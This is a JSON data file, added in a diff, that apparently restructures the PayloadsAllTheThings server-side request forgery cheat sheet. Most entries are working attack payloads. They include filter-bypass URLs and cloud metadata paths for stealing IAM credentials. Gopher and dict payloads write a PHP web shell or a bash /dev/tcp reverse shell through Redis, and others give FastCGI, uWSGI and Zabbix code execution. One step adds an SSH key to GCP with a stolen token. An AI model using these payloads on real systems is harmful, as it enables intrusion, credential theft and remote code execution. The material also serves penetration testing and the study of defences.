@@ -1,0 +1,524 @@
+{
+  "category": "Server Side Request Forgery",
+  "source": "PayloadsAllTheThings/Server Side Request Forgery/",
+  "entries": [
+    {
+      "subcategory": "Methodology",
+      "title": "How SSRF works (diagram)",
+      "language": "image",
+      "tags": ["ssrf", "methodology", "diagram"],
+      "body": "",
+      "meta": {
+        "kind": "image",
+        "src": "/img/server-side-request-forgery/SSRF_stream.png",
+        "caption": "The attacker makes the example.com server send a request to google.com. The response from the target service is returned to the attacker through the vulnerable server. Source: PayloadsAllTheThings."
+      }
+    },
+    {
+      "subcategory": "Methodology",
+      "title": "What SSRF is and what we target",
+      "language": "text",
+      "tags": ["methodology", "recon"],
+      "body": "SSRF occurs when an attacker makes the server send HTTP requests to an unintended location. The cause is that the server takes a URL/IP from the user and does not validate it.\n\nMain exploitation directions:\n• Access to cloud metadata (AWS/GCP/Azure -> credential theft).\n• Reading local files on the server (file://).\n• Network recon, port scanning via SSRF.\n• Sending packets to internal services (Redis, Memcached, FastCGI...) -> often RCE on an adjacent machine."
+    },
+    {
+      "subcategory": "Methodology",
+      "title": "Where to look for SSRF",
+      "language": "text",
+      "tags": ["methodology", "recon"],
+      "body": "• Any parameter that accepts a URL: url=, link=, src=, dest=, redirect=, proxy=, fetch=, image=, callback=.\n• Import by URL, link previews, webhooks, converters (HTML->PDF, video->GIF), avatar upload by URL.\n• XML/SVG parsers, ImageMagick, ffmpeg.\n• First thing, substitute http://169.254.169.254/latest/meta-data/ and http://127.0.0.1 - if the server reaches them, escalate."
+    },
+    {
+      "subcategory": "Methodology",
+      "title": "Tools for SSRF",
+      "language": "text",
+      "tags": ["tools"],
+      "body": "SSRFmap (swisskyrepo) - automatic fuzzer and exploitation for SSRF.\nGopherus (tarunkant) - generates gopher links for RCE in Redis/Memcached/MySQL/FastCGI/SMTP.\nSee-SURF (In3tinct) - search for potential SSRF parameters.\nSSRF-Sheriff (teknogeek) - a server for SSRF detection (Go).\nsurf (assetnote) - picks out live SSRF candidates.\nipfuscator (dwisiswant0) - quickly generates alternative representations of IPv4.\nr3dir (Horlad) - a redirect service for bypassing SSRF filters that do not check Location."
+    },
+
+    {
+      "subcategory": "Filter bypass - localhost",
+      "title": "Basic targets - localhost / 127.0.0.1 / 0.0.0.0",
+      "language": "http",
+      "tags": ["bypass", "localhost"],
+      "body": "http://localhost:80\nhttp://localhost:22\nhttps://localhost:443\nhttp://127.0.0.1:80\nhttp://127.0.0.1:22\nhttps://127.0.0.1:443\nhttp://0.0.0.0:80\nhttp://0.0.0.0:22\nhttps://0.0.0.0:443"
+    },
+    {
+      "subcategory": "Filter bypass - localhost",
+      "title": "Bypassing localhost via IPv6",
+      "language": "http",
+      "tags": ["bypass", "localhost", "ipv6"],
+      "body": "http://[::]:80/\nhttp://[0000::1]:80/\nhttp://[0:0:0:0:0:ffff:127.0.0.1]\nhttp://[::ffff:127.0.0.1]"
+    },
+    {
+      "subcategory": "Filter bypass - localhost",
+      "title": "Bypassing localhost via redirect domains",
+      "language": "table",
+      "tags": ["bypass", "localhost", "dns"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Domain", "Resolves to"],
+          "rows": [
+            ["localtest.me", "::1"],
+            ["localh.st", "127.0.0.1"],
+            ["spoofed.[BURP_COLLABORATOR]", "127.0.0.1"],
+            ["spoofed.redacted.oastify.com", "127.0.0.1"],
+            ["company.127.0.0.1.nip.io", "127.0.0.1"],
+            ["<anything>.<IP>.nip.io", "<IP> (any address as a DNS name)"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "Filter bypass - localhost",
+      "title": "Bypassing localhost via CIDR 127.0.0.0/8",
+      "language": "http",
+      "tags": ["bypass", "localhost", "cidr"],
+      "body": "http://127.127.127.127\nhttp://127.0.1.3\nhttp://127.0.0.0"
+    },
+    {
+      "subcategory": "Filter bypass - localhost",
+      "title": "Bypass via shorthand address notation",
+      "language": "http",
+      "tags": ["bypass", "localhost"],
+      "body": "http://0/\nhttp://127.1\nhttp://127.0.1"
+    },
+    {
+      "subcategory": "Filter bypass - localhost",
+      "title": "Bypass via IPv6 hostnames (/etc/hosts)",
+      "language": "http",
+      "tags": ["bypass", "localhost", "ipv6"],
+      "body": "http://ip6-localhost = ::1\nhttp://ip6-loopback = ::1"
+    },
+
+    {
+      "subcategory": "Filter bypass - IP encoding",
+      "title": "IP encoding - decimal / octal / hexadecimal",
+      "language": "table",
+      "tags": ["bypass", "ip-encoding"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Representation", "Example", "Equivalent"],
+          "rows": [
+            ["Decimal", "http://2130706433/", "http://127.0.0.1"],
+            ["Decimal", "http://3232235521/", "http://192.168.0.1"],
+            ["Decimal", "http://3232235777/", "http://192.168.1.1"],
+            ["Decimal", "http://2852039166/", "http://169.254.169.254"],
+            ["Octal", "http://0177.0.0.1/", "http://127.0.0.1"],
+            ["Octal (prefix variants)", "http://o177.0.0.1/ / http://0o177.0.0.1/ / http://q177.0.0.1/", "http://127.0.0.1"],
+            ["Hex", "http://0x7f000001", "http://127.0.0.1"],
+            ["Hex", "http://0xc0a80101", "http://192.168.1.1"],
+            ["Hex", "http://0xa9fea9fe", "http://169.254.169.254"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "Filter bypass - IP encoding",
+      "title": "URL-encoding the path (single / double)",
+      "language": "http",
+      "tags": ["bypass", "url-encoding"],
+      "body": "http://127.0.0.1/%61dmin\nhttp://127.0.0.1/%2561dmin"
+    },
+    {
+      "subcategory": "Filter bypass - IP encoding",
+      "title": "Enclosed alphanumeric / Unicode in the host",
+      "language": "text",
+      "tags": ["bypass", "unicode"],
+      "body": "Enclosed alphanumeric (uppercase/lowercase in circles) resolve as ordinary letters:\nhttp://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ = example.com\n\nUnicode digits: in .NET and Python 3, regex supports unicode by default, and \\d includes not only 0123456789 but also ๐๑๒๓๔๕๖๗๘๙ - you can slip past a blacklist."
+    },
+
+    {
+      "subcategory": "Filter bypass - other",
+      "title": "Bypass via redirect (307/308 preserve method and body)",
+      "language": "text",
+      "tags": ["bypass", "redirect", "open-redirect"],
+      "body": "Approach: on a whitelisted host, set up a page that redirects to the target internal URL (e.g. 192.168.0.1), and point the SSRF at vulnerable.com/index.php?url=http://redirect-server\nThe codes 307 Temporary Redirect and 308 Permanent Redirect preserve the HTTP method and request body after the redirect.\nTo avoid standing up your own server, use r3dir (Horlad)."
+    },
+    {
+      "subcategory": "Filter bypass - other",
+      "title": "Redirect via the ready-made service r3dir",
+      "language": "http",
+      "tags": ["bypass", "redirect"],
+      "body": "https://307.r3dir.me/--to/?url=http://localhost\nhttps://62epax5fhvj3zzmzigyoe5ipkbn7fysllvges3a.302.r3dir.me"
+    },
+    {
+      "subcategory": "Filter bypass - other",
+      "title": "DNS Rebinding (1u.ms)",
+      "language": "bash",
+      "tags": ["bypass", "dns-rebinding"],
+      "body": "# A domain that resolves alternately to 1.2.3.4 and 169.254.169.254\nmake-1.2.3.4-rebind-169.254-169.254-rr.1u.ms\n\n# Check the alternation of addresses\n$ nslookup make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms\nName:   make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms\nAddress: 1.2.3.4\n\n$ nslookup make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms\nName:   make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms\nAddress: 169.254.169.254"
+    },
+    {
+      "subcategory": "Filter bypass - other",
+      "title": "URL parser discrepancies (Orange Tsai)",
+      "language": "http",
+      "tags": ["bypass", "url-parser"],
+      "body": "http://127.1.1.1:80\\@127.2.2.2:80/\nhttp://127.1.1.1:80\\@@127.2.2.2:80/\nhttp://127.1.1.1:80:\\@@127.2.2.2:80/\nhttp://127.1.1.1:80#\\@127.2.2.2:80/\nhttp:127.0.0.1/"
+    },
+    {
+      "subcategory": "Filter bypass - other",
+      "title": "How different libraries parse http://1.1.1.1 &@2.2.2.2# @3.3.3.3/",
+      "language": "text",
+      "tags": ["bypass", "url-parser"],
+      "body": "One URL - different destination hosts depending on the library:\n• urllib2 -> takes 1.1.1.1\n• requests and browsers -> redirect to 2.2.2.2\n• urllib -> resolves 3.3.3.3\n• some parsers turn http:127.0.0.1/ into http://127.0.0.1/\nIdea: if the filter and the HTTP client use different parsers, the host the filter sees and the host the request actually goes to differ."
+    },
+    {
+      "subcategory": "Filter bypass - other",
+      "title": "Matrix of vulnerable parsers (CR-LF + URL parsing)",
+      "language": "image",
+      "tags": ["bypass", "url-parser", "crlf"],
+      "body": "",
+      "meta": {
+        "kind": "image",
+        "src": "/img/server-side-request-forgery/SSRF_Parser.png",
+        "caption": "Which libraries are vulnerable to CR-LF injection (Path/Host/SNI) and to Port/Host/Path spoofing during URL parsing: Python httplib/urllib/urllib2, Ruby Net::HTTP, Java net.URL, Perl LWP, NodeJS http, PHP http_wrapper, Wget. Research by Orange Tsai."
+      }
+    },
+    {
+      "subcategory": "Filter bypass - other",
+      "title": "Example of parser output for the \\@ payload",
+      "language": "image",
+      "tags": ["bypass", "url-parser"],
+      "body": "",
+      "meta": {
+        "kind": "image",
+        "src": "/img/server-side-request-forgery/WeakParser.jpg",
+        "caption": "Running http://127.1.1.1:80\\@127.2.2.2:80/ through parsers: Go net/url, Java net.URL, PHP parse_url, Perl URI, Ruby addressable take host=127.2.2.2, while Python urlparse leaves the whole tail in host. Source: PayloadsAllTheThings."
+      }
+    },
+    {
+      "subcategory": "Filter bypass - other",
+      "title": "Bypassing PHP filter_var(FILTER_VALIDATE_URL)",
+      "language": "php",
+      "tags": ["bypass", "php", "filter_var"],
+      "body": "<?php\n// In PHP 7.0.25, filter_var with FILTER_VALIDATE_URL lets such URLs through:\n echo var_dump(filter_var(\"http://test???test.com\", FILTER_VALIDATE_URL));\n echo var_dump(filter_var(\"0://evil.com;google.com\", FILTER_VALIDATE_URL));\n?>\n// Considered valid:\n// http://test???test.com\n// 0://evil.com:80;http://google.com:80/"
+    },
+    {
+      "subcategory": "Filter bypass - other",
+      "title": "The jar:// scheme (fully blind)",
+      "language": "http",
+      "tags": ["bypass", "jar", "java", "blind"],
+      "body": "jar:scheme://domain/path!/\njar:http://127.0.0.1!/\njar:https://127.0.0.1!/\njar:ftp://127.0.0.1!/"
+    },
+
+    {
+      "subcategory": "Cloud - AWS",
+      "title": "AWS - metadata endpoints (IMDS)",
+      "language": "http",
+      "tags": ["aws", "metadata", "imds"],
+      "body": "http://169.254.169.254/latest/meta-data/\nhttp://169.254.169.254/latest/meta-data/ami-id\nhttp://169.254.169.254/latest/meta-data/reservation-id\nhttp://169.254.169.254/latest/meta-data/hostname\nhttp://169.254.169.254/latest/meta-data/public-keys/\nhttp://169.254.169.254/latest/meta-data/public-keys/0/openssh-key\nhttp://169.254.169.254/latest/dynamic/instance-identity/document\nhttp://169.254.169.254/latest/user-data\n[fd00:ec2::254] - IPv6 endpoint"
+    },
+    {
+      "subcategory": "Cloud - AWS",
+      "title": "AWS - IAM role credentials (IMDSv1)",
+      "language": "http",
+      "tags": ["aws", "metadata", "iam", "credentials"],
+      "body": "http://169.254.169.254/latest/meta-data/iam/security-credentials\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]"
+    },
+    {
+      "subcategory": "Cloud - AWS",
+      "title": "AWS - IMDSv2 (requires X-aws-ec2-metadata-token)",
+      "language": "bash",
+      "tags": ["aws", "metadata", "imdsv2"],
+      "body": "export TOKEN=`curl -X PUT -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\" \"http://169.254.169.254/latest/api/token\"`\ncurl -H \"X-aws-ec2-metadata-token:$TOKEN\" -v \"http://169.254.169.254/latest/meta-data\""
+    },
+    {
+      "subcategory": "Cloud - AWS",
+      "title": "AWS - WAF bypass via DNS and redirect",
+      "language": "http",
+      "tags": ["aws", "metadata", "waf-bypass"],
+      "body": "http://instance-data\nhttp://169.254.169.254\nhttp://169.254.169.254.nip.io/\nStatic:http://nicob.net/redir6a\nDynamic:http://nicob.net/redir-http-169.254.169.254:80-"
+    },
+    {
+      "subcategory": "Cloud - AWS",
+      "title": "AWS - encoding 169.254.169.254 to bypass WAF",
+      "language": "table",
+      "tags": ["aws", "ip-encoding", "waf-bypass"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Representation", "Value"],
+          "rows": [
+            ["Dotted decimal with overflow", "http://425.510.425.510"],
+            ["Dotless decimal", "http://2852039166"],
+            ["Dotless decimal with overflow", "http://7147006462"],
+            ["Dotted hexadecimal", "http://0xA9.0xFE.0xA9.0xFE"],
+            ["Dotless hexadecimal", "http://0xA9FEA9FE"],
+            ["Dotless hexadecimal with overflow", "http://0x41414141A9FEA9FE"],
+            ["Dotted octal", "http://0251.0376.0251.0376"],
+            ["Dotted octal with padding", "http://0251.00376.000251.0000376"],
+            ["Mixed (octal + decimal)", "http://0251.254.169.254"],
+            ["IPv6 Compressed", "http://[::ffff:a9fe:a9fe]"],
+            ["IPv6 Expanded", "http://[0:0:0:0:0:ffff:a9fe:a9fe]"],
+            ["IPv6/IPv4", "http://[0:0:0:0:0:ffff:169.254.169.254]"],
+            ["IPv6", "http://[fd00:ec2::254]"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "Cloud - AWS",
+      "title": "AWS ECS - role credentials by UUID",
+      "language": "bash",
+      "tags": ["aws", "ecs", "credentials"],
+      "body": "# First pull the UUID from /proc/self/environ (file-read required), then:\ncurl http://169.254.170.2/v2/credentials/<UUID>\n# You get the IAM keys of the attached role"
+    },
+    {
+      "subcategory": "Cloud - AWS",
+      "title": "AWS Elastic Beanstalk - accountId, region, credentials",
+      "language": "http",
+      "tags": ["aws", "beanstalk", "credentials"],
+      "body": "http://169.254.169.254/latest/dynamic/instance-identity/document\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanstalk-ec2-role\n# Then with the obtained keys: aws s3 ls s3://elasticbeanstalk-us-east-2-[ACCOUNT_ID]/"
+    },
+    {
+      "subcategory": "Cloud - AWS",
+      "title": "AWS Lambda - Runtime API",
+      "language": "http",
+      "tags": ["aws", "lambda"],
+      "body": "http://localhost:9001/2018-06-01/runtime/invocation/next\nhttp://${AWS_LAMBDA_RUNTIME_API}/2018-06-01/runtime/invocation/next"
+    },
+
+    {
+      "subcategory": "Cloud - GCP",
+      "title": "Google Cloud - endpoints (requires Metadata-Flavor: Google)",
+      "language": "http",
+      "tags": ["gcp", "metadata"],
+      "body": "http://169.254.169.254/computeMetadata/v1/\nhttp://metadata.google.internal/computeMetadata/v1/\nhttp://metadata/computeMetadata/v1/\nhttp://metadata.google.internal/computeMetadata/v1/instance/hostname\nhttp://metadata.google.internal/computeMetadata/v1/instance/id\nhttp://metadata.google.internal/computeMetadata/v1/project/project-id\nhttp://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true"
+    },
+    {
+      "subcategory": "Cloud - GCP",
+      "title": "Google Cloud - Beta endpoint (WITHOUT the header)",
+      "language": "http",
+      "tags": ["gcp", "metadata", "bypass"],
+      "body": "http://metadata.google.internal/computeMetadata/v1beta1/\nhttp://metadata.google.internal/computeMetadata/v1beta1/?recursive=true\nhttp://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json\nhttp://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token\nhttp://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json"
+    },
+    {
+      "subcategory": "Cloud - GCP",
+      "title": "Google Cloud - set headers via gopher",
+      "language": "http",
+      "tags": ["gcp", "gopher", "metadata"],
+      "body": "gopher://metadata.google.internal:80/xGET%20/computeMetadata/v1/instance/attributes/ssh-keys%20HTTP%2f%31%2e%31%0AHost:%20metadata.google.internal%0AAccept:%20%2a%2f%2a%0aMetadata-Flavor:%20Google%0d%0a"
+    },
+    {
+      "subcategory": "Cloud - GCP",
+      "title": "Google Cloud - add an SSH key via a stolen token",
+      "language": "bash",
+      "tags": ["gcp", "ssh", "privesc"],
+      "body": "# Check the token scope\ncurl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=ya29.XXXXXKuXXXXXXXkGT0rJSA\n\n# If auth/compute is present, push your own SSH key into the project metadata\ncurl -X POST \"https://www.googleapis.com/compute/v1/projects/1042377752888/setCommonInstanceMetadata\" \\\n-H \"Authorization: Bearer ya29.c.EmKeBq9XI09_1HK1XXXXXXXXT0rJSA\" \\\n-H \"Content-Type: application/json\" \\\n--data '{\"items\": [{\"key\": \"sshkeyname\", \"value\": \"sshkeyvalue\"}]}'"
+    },
+
+    {
+      "subcategory": "Cloud - other providers",
+      "title": "Azure - Instance Metadata Service (requires Metadata: true)",
+      "language": "http",
+      "tags": ["azure", "metadata"],
+      "body": "http://169.254.169.254/metadata/v1/maintenance\nhttp://169.254.169.254/metadata/instance?api-version=2017-04-02\nhttp://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text"
+    },
+    {
+      "subcategory": "Cloud - other providers",
+      "title": "Digital Ocean - metadata",
+      "language": "http",
+      "tags": ["digitalocean", "metadata"],
+      "body": "http://169.254.169.254/metadata/v1.json\nhttp://169.254.169.254/metadata/v1/id\nhttp://169.254.169.254/metadata/v1/user-data\nhttp://169.254.169.254/metadata/v1/hostname\nhttp://169.254.169.254/metadata/v1/region\nhttp://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address"
+    },
+    {
+      "subcategory": "Cloud - other providers",
+      "title": "Oracle Cloud - metadata",
+      "language": "http",
+      "tags": ["oracle", "metadata"],
+      "body": "http://192.0.0.192/latest/\nhttp://192.0.0.192/latest/user-data/\nhttp://192.0.0.192/latest/meta-data/\nhttp://192.0.0.192/latest/attributes/"
+    },
+    {
+      "subcategory": "Cloud - other providers",
+      "title": "Alibaba - metadata",
+      "language": "http",
+      "tags": ["alibaba", "metadata"],
+      "body": "http://100.100.100.200/latest/meta-data/\nhttp://100.100.100.200/latest/meta-data/instance-id\nhttp://100.100.100.200/latest/meta-data/image-id"
+    },
+    {
+      "subcategory": "Cloud - other providers",
+      "title": "Hetzner Cloud - metadata",
+      "language": "http",
+      "tags": ["hetzner", "metadata"],
+      "body": "http://169.254.169.254/hetzner/v1/metadata\nhttp://169.254.169.254/hetzner/v1/metadata/hostname\nhttp://169.254.169.254/hetzner/v1/metadata/instance-id\nhttp://169.254.169.254/hetzner/v1/metadata/public-ipv4\nhttp://169.254.169.254/hetzner/v1/metadata/private-networks\nhttp://169.254.169.254/hetzner/v1/metadata/availability-zone\nhttp://169.254.169.254/hetzner/v1/metadata/region"
+    },
+    {
+      "subcategory": "Cloud - other providers",
+      "title": "OpenStack / RackSpace / HP Helion / Packet",
+      "language": "http",
+      "tags": ["openstack", "metadata"],
+      "body": "http://169.254.169.254/openstack\nhttp://169.254.169.254/2009-04-04/meta-data/\nhttps://metadata.packet.net/userdata"
+    },
+    {
+      "subcategory": "Cloud - other providers",
+      "title": "Kubernetes ETCD / Docker / Rancher",
+      "language": "bash",
+      "tags": ["kubernetes", "docker", "rancher", "metadata"],
+      "body": "# Kubernetes ETCD - API keys, internal IPs/ports\ncurl -L http://127.0.0.1:2379/version\ncurl http://127.0.0.1:2379/v2/keys/?recursive=true\n\n# Docker Engine API\nhttp://127.0.0.1:2375/v1.24/containers/json\ncurl --unix-socket /var/run/docker.sock http://foo/containers/json\ncurl --unix-socket /var/run/docker.sock http://foo/images/json\n\n# Rancher\ncurl http://rancher-metadata/<version>/<path>"
+    },
+
+    {
+      "subcategory": "Protocols (URL schemes)",
+      "title": "file:// - reading files",
+      "language": "http",
+      "tags": ["protocol", "file", "file-read"],
+      "body": "file:///etc/passwd\nfile://\\/\\/etc/passwd"
+    },
+    {
+      "subcategory": "Protocols (URL schemes)",
+      "title": "http:// - fetch and port scanning",
+      "language": "http",
+      "tags": ["protocol", "http", "port-scan"],
+      "body": "ssrf.php?url=http://127.0.0.1:22\nssrf.php?url=http://127.0.0.1:80\nssrf.php?url=http://127.0.0.1:443"
+    },
+    {
+      "subcategory": "Protocols (URL schemes)",
+      "title": "dict:// - accessing dictionary/text services",
+      "language": "http",
+      "tags": ["protocol", "dict"],
+      "body": "dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>\nssrf.php?url=dict://attacker:11111/"
+    },
+    {
+      "subcategory": "Protocols (URL schemes)",
+      "title": "sftp:// / tftp:// / ldap:// / netdoc://",
+      "language": "http",
+      "tags": ["protocol", "sftp", "tftp", "ldap"],
+      "body": "ssrf.php?url=sftp://evil.com:11111/\nssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET\nssrf.php?url=ldap://localhost:11211/%0astats%0aquit\nssrf.php?url=netdoc:///etc/passwd"
+    },
+    {
+      "subcategory": "Protocols (URL schemes)",
+      "title": "gopher:// - sending arbitrary TCP data",
+      "language": "http",
+      "tags": ["protocol", "gopher"],
+      "body": "gopher://[host]:[port]/[type][selector]\ngopher://localhost:25/_MAIL%20FROM:<attacker@example.com>%0D%0A"
+    },
+    {
+      "subcategory": "Protocols (URL schemes)",
+      "title": "Tip on netdoc://",
+      "language": "text",
+      "tags": ["protocol", "netdoc", "java"],
+      "body": "netdoc:// - a wrapper for Java when a payload trips over the \\n and \\r characters. Handy for reading files when file:// is stripped by the filter or breaks on newlines."
+    },
+
+    {
+      "subcategory": "Service gopher smuggling",
+      "title": "Redis -> web shell via CONFIG SET (raw commands)",
+      "language": "text",
+      "tags": ["gopher", "redis", "rce", "webshell"],
+      "body": "CONFIG SET dir /var/www/html\nCONFIG SET dbfilename file.php\nSET mykey \"<?php system($_GET[0])?>\"\nSAVE\n\nIdea: change dir to the webroot, dbfilename to file.php, put a PHP shell into the key, and SAVE dumps it to disk -> /var/www/html/file.php."
+    },
+    {
+      "subcategory": "Service gopher smuggling",
+      "title": "Redis -> web shell via dict://",
+      "language": "http",
+      "tags": ["gopher", "redis", "dict", "rce"],
+      "body": "dict://127.0.0.1:6379/CONFIG%20SET%20dir%20/var/www/html\ndict://127.0.0.1:6379/CONFIG%20SET%20dbfilename%20file.php\ndict://127.0.0.1:6379/SET%20mykey%20\"<\\x3Fphp system($_GET[0])\\x3F>\"\ndict://127.0.0.1:6379/SAVE"
+    },
+    {
+      "subcategory": "Service gopher smuggling",
+      "title": "Redis -> PHP reverse shell via gopher://",
+      "language": "http",
+      "tags": ["gopher", "redis", "reverse-shell", "rce"],
+      "body": "gopher://127.0.0.1:6379/_config%20set%20dir%20%2Fvar%2Fwww%2Fhtml\ngopher://127.0.0.1:6379/_config%20set%20dbfilename%20reverse.php\ngopher://127.0.0.1:6379/_set%20payload%20%22%3C%3Fphp%20shell_exec%28%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FREMOTE_IP%2FREMOTE_PORT%200%3E%261%27%29%3B%3F%3E%22\ngopher://127.0.0.1:6379/_save"
+    },
+    {
+      "subcategory": "Service gopher smuggling",
+      "title": "FastCGI -> RCE via gopher:// (php-fpm on :9000)",
+      "language": "http",
+      "tags": ["gopher", "fastcgi", "php-fpm", "rce"],
+      "body": "gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%04%04%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH58%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/usr/share/php/PEAR.php%0D%01DOCUMENT_ROOT/%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%3A%04%00%3C%3Fphp%20system%28%27whoami%27%29%3F%3E%00%00%00%00"
+    },
+    {
+      "subcategory": "Service gopher smuggling",
+      "title": "MySQL -> query execution via gopher:// (Gopherus)",
+      "language": "bash",
+      "tags": ["gopher", "mysql", "gopherus"],
+      "body": "$ python2.7 ./gopherus.py --exploit mysql\nGive MySQL username: root\nGive query to execute: SELECT 123;\n\ngopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%0c%00%00%00%03%53%45%4c%45%43%54%20%31%32%33%3b%01%00%00%00%01"
+    },
+    {
+      "subcategory": "Service gopher smuggling",
+      "title": "Memcached -> RCE via Gopherus",
+      "language": "bash",
+      "tags": ["gopher", "memcached", "gopherus"],
+      "body": "# Memcached is on :11211 by default, vulnerable on deserialization\npython2.7 ./gopherus.py --exploit pymemcache\npython2.7 ./gopherus.py --exploit rbmemcache\npython2.7 ./gopherus.py --exploit phpmemcache\npython2.7 ./gopherus.py --exploit dmpmemcache"
+    },
+    {
+      "subcategory": "Service gopher smuggling",
+      "title": "SMTP -> sending an email via gopher://",
+      "language": "http",
+      "tags": ["gopher", "smtp"],
+      "body": "gopher://localhost:25/_MAIL%20FROM:<attacker@example.com>%0D%0A"
+    },
+    {
+      "subcategory": "Service gopher smuggling",
+      "title": "SMTP -> gopher payload generator (PHP redirect)",
+      "language": "php",
+      "tags": ["gopher", "smtp", "redirect"],
+      "body": "<?php\n    $commands = array(\n            'HELO victim.com',\n            'MAIL FROM: <admin@victim.com>',\n            'RCPT To: <User@[ATTACKER.DOMAIN.TLD]>',\n            'DATA',\n            'Subject: @hacker!',\n            'Hello Friend',\n            '.'\n    );\n    $payload = implode('%0A', $commands);\n    header('Location: gopher://0:25/_'.$payload);\n?>"
+    },
+    {
+      "subcategory": "Service gopher smuggling",
+      "title": "uWSGI -> RCE via gopher:// (UWSGI_FILE)",
+      "language": "http",
+      "tags": ["gopher", "wsgi", "uwsgi", "rce"],
+      "body": "gopher://localhost:8000/_%00%1A%00%00%0A%00UWSGI_FILE%0C%00/tmp/test.py"
+    },
+    {
+      "subcategory": "Service gopher smuggling",
+      "title": "uWSGI - breakdown of the UWSGI_FILE packet",
+      "language": "table",
+      "tags": ["gopher", "wsgi", "uwsgi"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Field", "Size", "Value"],
+          "rows": [
+            ["modifier1", "1 byte", "0 (%00)"],
+            ["datasize", "2 bytes", "26 (%1A%00)"],
+            ["modifier2", "1 byte", "0 (%00)"],
+            ["key length", "2 bytes", "10 (%0A%00)"],
+            ["key data", "m bytes", "UWSGI_FILE"],
+            ["value length", "2 bytes", "12 (%0C%00)"],
+            ["value data", "n bytes", "/tmp/test.py"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "Service gopher smuggling",
+      "title": "Zabbix Agent -> RCE via gopher:// (EnableRemoteCommands=1)",
+      "language": "http",
+      "tags": ["gopher", "zabbix", "rce"],
+      "body": "gopher://127.0.0.1:10050/_system.run%5B%28id%29%3Bsleep%202s%5D"
+    },
+    {
+      "subcategory": "Service gopher smuggling",
+      "title": "DNS AXFR -> dumping subdomains (gopher generator)",
+      "language": "python",
+      "tags": ["gopher", "dns", "axfr"],
+      "body": "from urllib.parse import quote\ndomain,tld = \"example.lab\".split('.')\ndns_request =  b\"\\x01\\x03\\x03\\x07\"    # BITMAP\ndns_request += b\"\\x00\\x01\"            # QCOUNT\ndns_request += b\"\\x00\\x00\"            # ANCOUNT\ndns_request += b\"\\x00\\x00\"            # NSCOUNT\ndns_request += b\"\\x00\\x00\"            # ARCOUNT\ndns_request += len(domain).to_bytes() # LEN DOMAIN\ndns_request += domain.encode()        # DOMAIN\ndns_request += len(tld).to_bytes()    # LEN TLD\ndns_request += tld.encode()           # TLD\ndns_request += b\"\\x00\"                # DNAME EOF\ndns_request += b\"\\x00\\xFC\"            # QTYPE AXFR (252)\ndns_request += b\"\\x00\\x01\"            # QCLASS IN (1)\ndns_request = len(dns_request).to_bytes(2, byteorder=\"big\") + dns_request\nprint(f'gopher://127.0.0.1:25/_{quote(dns_request)}')"
+    },
+
+    {
+      "subcategory": "Blind SSRF and escalation",
+      "title": "Blind SSRF - out-of-band chains",
+      "language": "text",
+      "tags": ["blind", "out-of-band"],
+      "body": "When you cannot read the response, use blind SSRF chains for OOB output (repository assetnote/blind-ssrf-chains).\n\nVia HTTP(s): Elasticsearch, Weblogic, Hashicorp Consul, Shellshock, Apache Druid/Solr/Struts, PeopleSoft, JBoss, Confluence, Jira, OpenTSDB, Jenkins, Hystrix, W3 Total Cache, Docker, Gitlab Redis Exporter.\nVia Gopher: Redis, Memcache, Apache Tomcat."
+    },
+    {
+      "subcategory": "Blind SSRF and escalation",
+      "title": "Upgrading SSRF to XSS via SVG",
+      "language": "bash",
+      "tags": ["xss", "svg", "escalation"],
+      "body": "# If the SSRF has no critical impact (network is segmented, files cannot be pulled),\n# slip in an SVG with JavaScript to escalate to XSS\nhttps://example.com/ssrf.php?url=http://brutelogic.com.br/poc.svg"
+    }
+  ]
+}
